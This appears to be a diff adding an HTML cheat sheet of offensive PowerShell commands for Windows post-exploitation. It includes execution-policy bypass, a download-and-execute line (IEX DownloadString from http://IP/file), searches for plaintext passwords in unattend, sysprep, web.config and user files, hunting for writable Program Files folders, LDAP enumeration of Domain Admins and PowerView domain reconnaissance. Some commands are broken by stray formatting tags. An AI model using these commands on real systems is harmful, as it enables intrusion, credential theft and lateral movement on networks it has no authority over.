@@ -1,0 +1,77 @@
+<p>powershell.exe -nop -exec bypass
+Enter-PSSession -ComputerName 127.0.0.1 -Port 5986 -UseSSL -Credential $cred -SessionOption (New-PSSessionOption - SkipCACheck - SkipCNCheck)</p>
+
+<p>INFO ON CMDLETS/MODULES
+Get-Help; Get-Commands -Module MODULE</p>
+
+<p>ADDING MODULES TO SESSION
+Import-Module C:\Path\to\name.ps1</p>
+
+<p>GETTIMG FILES
+Invoke-WebRequest -Outfile C:\place\to\put http://IP/filetoget
+IEX (New-Object Net.WebClient).DownloadString('http://IP/file')
+(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") </p>
+
+<p>INVOKE COMMAND -ICM
+Invoke-Command -ComputerName <name> -ScriptBlock {whoami}
+$username = 'DOMAIN\USERNAME'; $password = 'PASSWORD'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username,$securePassword; Invoke-Command -ComputerName BOX01 -Credential $credential -ScriptBlock {whoami};</p>
+
+<p>GET LANGUAGE MODE
+$ExecutionContext.SessionState.LanguageMode</p>
+
+<p>x86 or x64
+ENVIRONMENT VARIABLES
+Get-ChildItem Env: | ft Key,Value
+$env:UserName</p>
+
+<p>CONNECTED DRIVES
+Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root</p>
+
+<p>FIND USERS &amp; GROUPS
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+Get-LocalGroup | ft Name
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource</p>
+
+<p>REGISTRY
+Get-ItemProperty -Path 'Registry::HKEY<em>LOCAL</em>MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+Get-ChildItem -path Registry::HKEY<em>LOCAL</em>MACHINE\SOFTWARE | ft Name</p>
+
+<p>PROGRAM &amp; PERMISSIONS
+icacls "C:\Program Files*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
+Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+Get-ChildItem 'C:\Program Files*','C:\Program Files (x86)*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($<em>.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} 
+Get-ChildItem 'C:\Program Files*','C:\Program Files (x86)*' | % { try { Get-Acl $</em> -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} </p>
+
+<p>SCHEDULED TASKS
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State</p>
+
+<p>NETWORKING
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse</p>
+
+<p>FILES
+Get-Childitem –Path C:\ -Include <em>unattend</em>,<em>sysprep</em> -File -Recurse -ErrorAction SilentlyContinue | where {($<em>.Name -like "*.xml" -or $</em>.Name -like "<em>.txt" -or $_.Name -like "</em>.ini")}
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+Get-Childitem –Path C:\Users\ -Include <em>password</em>,<em>vnc</em>,<em>.config -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:* -include *.xml,</em>.ini,<em>.txt,</em>.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"</p>
+
+<p>LDAP
+$username = 'fulcrum.local\LDAP'; $password = 'PASSWORD'; $DomainControllerIpAddress = 'IP'; $LdapDn = 'DC=fulcrum,DC=local'; $dn = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainControllerIpAddress):389/$LdapDn", $username, $password); $ds = New-Object System.DirectoryServices.DirectorySearcher($dn); $ds.SearchRoot;
+    $ds.Filter ="((objectCategory=computer))"; $ds.FindAll();
+    $ds.Filter ="((objectCategory=user))"; $ds.FindAll();
+    $ds.filter = "(&amp;(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=fulcrum,dc=local))"; $ds.FindAll();
+    $ds.Filter ="((name=Administrator))"; $ds.FindAll().properties;
+    $ds.Filter ="((name=Bob*))"; $ds.FindAll().properties;</p>
+
+<p>$secpasswd = ConvertTo-SecureString "1234test" -AsPlainText -Force; $mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd); $computer = "MINION"; [System.Diagnostics.Process]::Start("C:\temp\icmp.bat",$mycreds.Username,$mycreds.Password,$computer)</p>
+
+<p>POWERVIEW
+Get-NetDomain; Get-NetComputer; Get-NetComputer | Get-NetLoggedon; Get-NetGPO; Get-NetGPOGroup; Convert-SidToName;
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $<em>.Name}
+Get-NetGPO -DisplayName MailServer-Config | %{Get-ObjectAcl -ResolveGUIDs -Name $</em>.Name}
+Get-NetOU -GUID "{2259E5B0-3B49-4704-98BB-5A9581B54E8E}" | %{Get-NetComputer -ADSpath $_}
+Invoke-GpUpdate -Computer MX01 -Force</p>
